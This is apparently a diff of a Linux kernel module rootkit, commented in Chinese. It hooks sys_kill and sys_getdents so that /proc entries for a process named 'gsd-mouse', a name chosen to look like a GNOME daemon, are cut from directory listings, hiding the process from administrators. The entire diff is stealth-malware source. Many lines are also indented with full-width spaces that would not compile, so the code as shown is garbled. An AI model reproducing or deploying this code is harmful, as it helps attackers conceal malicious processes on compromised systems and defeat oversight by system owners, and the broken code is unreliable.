@@ -18,8 +18,6 @@
 #include <linux/dirent.h>
 
 #define FLAG 0x80000000
-char* processname="gsd-mouse";
-
 const char *protected = "gsd-mouse";
 int protected_pid = -1;
 int myatoi(char *str)
@@ -73,7 +71,7 @@ int get_process(pid_t pid)
 　　if (task)
 　　{
 　　	get_name(task, buffer);
-　　	if(strstr(buffer,processname))	return 1;  //比较processname 和目录下的进程名
+　　	if(strstr(buffer,protected))	return 1;  //比较protected 和目录下的进程名
 	　　else return 0;
 　　}
 　　else
@@ -207,21 +205,31 @@ static long khook_sys_kill(pid_t pid, int sig) {
 
 KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
-	long value=0;
-	int temp,len;
-	value=KHOOK_ORIGIN(fd, dirp, count);
-	temp=value;
-	while(temp>0){
-		len=dirp->d_reclen;
-		temp=temp-len;
-		printk("%s\n",dirp->d_name);
-		if(get_process(myatoi(dirp->d_name))){
-			printk("find process\n");
-			memmove(dirp, (char *) dirp + dirp->d_reclen, temp);
-			value=value-len;
-		}
-		if(temp)
-　　	dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
+	long value;
+　　struct inode *dinode;
+　　int len = 0;
+　　int tlen = 0;
+　　struct linux_dirent64 *mydir = NULL;
+　　//end
+　　//在这里调用一下sys_getdents,得到返回的结果
+　　value = (*orig_getdents) (fd, dirp, count);
+　　tlen = value;
+　　//遍历得到的目录列表
+　　while(tlen > 0)
+　　{
+　　len = dirp->d_reclen;
+　　tlen = tlen - len;
+　　printk("%s\n",dirp->d_name);
+　　//在proc文件系统中，目录名就是pid,我们再根据pid找到进程名
+　　if(get_process(myatoi(dirp->d_name)) )
+　　{
+　　printk("find process\n");
+　　//发现匹配的进程，调用memmove将这条进程覆盖掉
+　　memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
+　　value = value - len;
+　　}
+　　if(tlen)
+　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
 　　}
 　　return value;
 }
